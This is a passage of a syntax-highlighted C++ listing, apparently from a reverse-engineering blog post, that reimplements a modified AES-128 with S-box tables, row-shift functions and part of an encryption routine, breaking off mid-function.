class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> INV_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line"><span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line"><span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">shift_rows</span><span class="params">(<span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">temp = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = *state;</span><br><span class="line">*state = temp;</span><br><span class="line">tempa = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = tempa;</span><br><span class="line">tempb = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = tempb;</span><br><span class="line">tempc = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = tempc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">inv_shiftrows</span><span class="params">( <span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//temp = state[12];</span></span><br><span class="line"><span class="comment">//state[12] = state[8];</span></span><br><span class="line"><span class="comment">//state[8] = state[4];</span></span><br><span class="line"><span class="comment">//state[4] = *state;</span></span><br><span class="line"><span class="comment">//*state = temp;</span></span><br><span class="line"></span><br><span class="line">temp = *state;</span><br><span class="line">*state = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = temp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempa = state[1];</span></span><br><span class="line"><span class="comment">//state[1] = state[9];</span></span><br><span class="line"><span class="comment">//state[9] = tempa;</span></span><br><span class="line"></span><br><span class="line">tempa = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = tempa;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempb = state[5];</span></span><br><span class="line"><span class="comment">//state[5] = state[13];</span></span><br><span class="line"><span class="comment">//state[13] = tempb;</span></span><br><span class="line"></span><br><span class="line">tempb = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = tempb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tempc = state[2];</span></span><br><span class="line"><span class="comment">//state[2] = state[6];</span></span><br><span class="line"><span class="comment">//state[6] = state[10];</span></span><br><span class="line"><span class="comment">//state[10] = state[14];</span></span><br><span class="line"><span class="comment">//state[14] = tempc;</span></span><br><span class="line"></span><br><span class="line">tempc = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = tempc;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint8_t</span> __cdecl <span class="title">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((a &amp; <span class="number">0x80</span>u) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">aes_encrypt_128</span><span class="params">(BYTE* roundkeys, BYTE* m, BYTE* c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* mid; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v4; <span class="comment">// rax</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint8_t</span>* v5; <span class="comment">// rax</span></span><br><span class="line"><span class="type">uint8_t</span> tmp[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">uint8_t</span> t; <span class="comment">// [rsp+3Dh] [rbp-3h]</span></span><br><span class="line"><span class="type">uint8_t</span> j; <span class="comment">// [rsp+3Eh] [rbp-2h]</span></span><br><span class="line"><span class="type">uint8_t</span> i; <span class="comment">// [rsp+3Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">mid = roundkeys++;</span><br><span class="line">c[i] = *mid ^ m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= <span class="number">9u</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">tmp[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(tmp);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">c[i] = t ^ tmp[i] ^ <span class="built_in">mul2</span>(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">c[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">c[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">c[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ <span class="built_in">mul2</span>(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v4 = roundkeys++;</span><br><span class="line">c[i] ^= *v4;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; ++i)</span><br><span class="line">c[i] = INV_SBOX[c[i]];</span><br><span class="line"><span class="built_in">shift_rows</span>(c);</span><br><span class="line"></span><br><span 